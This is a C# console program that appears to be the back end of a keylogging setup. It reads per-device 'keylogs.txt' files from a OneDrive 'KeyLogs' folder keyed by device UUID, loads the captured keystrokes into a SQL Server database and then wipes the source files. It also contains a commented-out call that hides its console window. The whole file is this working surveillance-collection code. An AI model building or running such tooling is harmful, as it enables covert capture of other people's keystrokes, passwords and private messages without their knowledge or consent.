using facadefinal;
using System.Runtime.InteropServices;

class Program
{
    const int SW_HIDE = 0;
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    static void Main()
    {
        //ShowWindow(GetConsoleWindow(), SW_HIDE);

        string connectionString = @"Data Source=DESKTOP-IE3HQQ5\SQLEXPRESS01;Initial Catalog=FinalKeyLoss;Integrated Security=True;Encrypt=True;Trust Server Certificate=True";
        var facade = new KeylogReaderFacade(connectionString);

        string oneDrivePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "OneDrive", "KeyLogs");
        if (!Directory.Exists(oneDrivePath)) return;

        foreach (var folder in Directory.GetDirectories(oneDrivePath))
        {
            string uuidStr = Path.GetFileName(folder);
            string filePath = Path.Combine(folder, "keylogs.txt");
            if (!File.Exists(filePath)) continue;

            string[] lines = File.ReadAllLines(filePath);
            if (lines.Length == 0) continue;

            try
            {
                facade.ProcessDevice(uuidStr, lines);
                File.WriteAllText(filePath, string.Empty);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error processing device {uuidStr}: {ex.Message}");
            }
            Console.ReadKey();
        }
    }
}
